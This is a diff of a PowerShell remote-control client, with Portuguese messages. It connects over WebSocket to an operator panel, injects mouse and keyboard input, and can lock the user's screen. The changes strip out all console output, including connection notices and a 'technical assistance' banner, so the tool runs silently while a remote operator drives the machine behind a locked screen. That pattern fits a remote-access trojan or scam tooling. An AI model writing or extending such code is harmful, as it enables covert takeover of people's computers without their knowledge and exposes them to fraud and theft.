@@ -176,16 +176,12 @@ function DoClick($x, $y, $btn, $n) {
     $rx = [int]($x / $Global:scale)
     $ry = [int]($y / $Global:scale)
     $b = if ($btn -eq 'right') { 1 } elseif ($btn -eq 'middle') { 2 } else { 0 }
-    $r = [Input]::Click($rx, $ry, $b, $n)
-    Write-Host "  CLICK ($rx,$ry) btn=$btn result=$r" -ForegroundColor Green
+    [Input]::Click($rx, $ry, $b, $n) | Out-Null
 }
 
 function DoKey($k) {
     $vk = GetVK $k
-    if ($vk -gt 0) {
-        $r = [Input]::Key([uint16]$vk)
-        Write-Host "  KEY '$k' vk=$vk result=$r" -ForegroundColor Cyan
-    }
+    if ($vk -gt 0) { [Input]::Key([uint16]$vk) | Out-Null }
 }
 
 function DoCombo($keys) {
@@ -194,16 +190,12 @@ function DoCombo($keys) {
         $vk = GetVK $k
         if ($vk -gt 0) { $vks += $vk }
     }
-    Write-Host "  COMBO $($keys -join '+')" -ForegroundColor Cyan
     foreach ($vk in $vks) { [Input]::KeyDown([uint16]$vk); Start-Sleep -Milliseconds 20 }
     Start-Sleep -Milliseconds 50
     for ($i = $vks.Count - 1; $i -ge 0; $i--) { [Input]::KeyUp([uint16]$vks[$i]); Start-Sleep -Milliseconds 20 }
 }
 
-function DoScroll($d) {
-    $r = [Input]::Scroll($d)
-    Write-Host "  SCROLL delta=$d result=$r" -ForegroundColor Yellow
-}
+function DoScroll($d) { [Input]::Scroll($d) | Out-Null }
 
 function DoMove($x, $y) {
     $rx = [int]($x / $Global:scale)
@@ -214,7 +206,6 @@ function DoMove($x, $y) {
 function Lock($msg) {
     if ($Global:locked) { return }
     $Global:locked = $true
-    Write-Host "  LOCK: $msg" -ForegroundColor Magenta
 
     $Global:lockSync = [hashtable]::Synchronized(@{ Stop = $false })
 
@@ -304,7 +295,6 @@ public class LockAPI {
 function Unlock {
     if (-not $Global:locked) { return }
     $Global:locked = $false
-    Write-Host "  UNLOCK" -ForegroundColor Green
 
     if ($Global:lockSync) {
         $Global:lockSync.Stop = $true
@@ -329,7 +319,6 @@ function Run {
         try {
             $ws = New-Object Net.WebSockets.ClientWebSocket
             $ws.ConnectAsync([Uri]$Global:URL, [Threading.CancellationToken]::None).Wait() | Out-Null
-            Write-Host "  Conectado!" -ForegroundColor Green
 
             $info = @{
                 type = "register-client"
@@ -360,9 +349,9 @@ function Run {
                         $msg = [Text.Encoding]::UTF8.GetString($buf, 0, $res.Count) | ConvertFrom-Json
 
                         switch ($msg.type) {
-                            "registered" { $Global:id = $msg.clientId; Write-Host "  ID: $($Global:id)" -ForegroundColor Yellow }
-                            "panel-connected" { $Global:panel = $true; Write-Host "  Painel conectou!" -ForegroundColor Green }
-                            "panel-disconnected" { $Global:panel = $false; Unlock; Write-Host "  Painel desconectou" -ForegroundColor Red }
+                            "registered" { $Global:id = $msg.clientId }
+                            "panel-connected" { $Global:panel = $true }
+                            "panel-disconnected" { $Global:panel = $false; Unlock }
                             "mouse-click" { DoClick $msg.x $msg.y $msg.button $(if ($msg.clicks) { $msg.clicks } else { 1 }) }
                             "mouse-move" { DoMove $msg.x $msg.y }
                             "mouse-scroll" { DoScroll $msg.delta }
@@ -396,25 +385,15 @@ function Run {
                 Start-Sleep -Milliseconds 20
             }
 
-            # Conexao caiu - desbloquear tela
             Unlock
             $Global:panel = $false
-            Write-Host "  Conexao perdida, reconectando..." -ForegroundColor Yellow
             $ws.Dispose()
         } catch {
-            # Erro - desbloquear tela
             Unlock
             $Global:panel = $false
-            Write-Host "  Erro: $($_.Exception.Message)" -ForegroundColor Red
             Start-Sleep -Seconds 5
         }
     }
 }
-
-Write-Host ""
-Write-Host "  ================================================" -ForegroundColor Cyan
-Write-Host "  |          ASSISTENCIA TECNICA                 |" -ForegroundColor Cyan
-Write-Host "  ================================================" -ForegroundColor Cyan
-Write-Host ""
 
 Run
